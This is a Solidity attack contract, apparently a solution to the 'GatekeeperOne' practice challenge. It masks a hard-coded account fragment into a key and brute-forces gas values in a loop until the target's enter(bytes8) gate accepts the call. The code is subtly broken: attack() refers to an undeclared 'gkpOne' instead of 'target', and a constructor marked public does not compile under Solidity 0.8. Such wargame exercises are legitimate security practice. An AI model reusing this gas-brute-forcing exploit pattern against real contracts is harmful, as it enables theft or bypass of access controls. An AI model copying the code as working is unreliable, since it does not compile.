// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./GatekeeperOne.sol";

contract GatekeeperOneAttack {
    bytes8 txOrigin16 = 0x080069063e886271; // Last 16 digits of your account.
    bytes8 key = txOrigin16 & 0xFFFFFFFF0000FFFF;
    GatekeeperOne public target;

    constructor(address _targetAddress) public {
        target = GatekeeperOne(_targetAddress);
    }

    function attack() public {
        for (uint256 i = 0; i < 120; i++) {
            (bool result, bytes memory data) = address(gkpOne).call{gas: i + 150 + 8191 * 3}(abi.encodeWithSignature("enter(bytes8)", key));
            if (result) {
                break;
            }
        }
    }
}
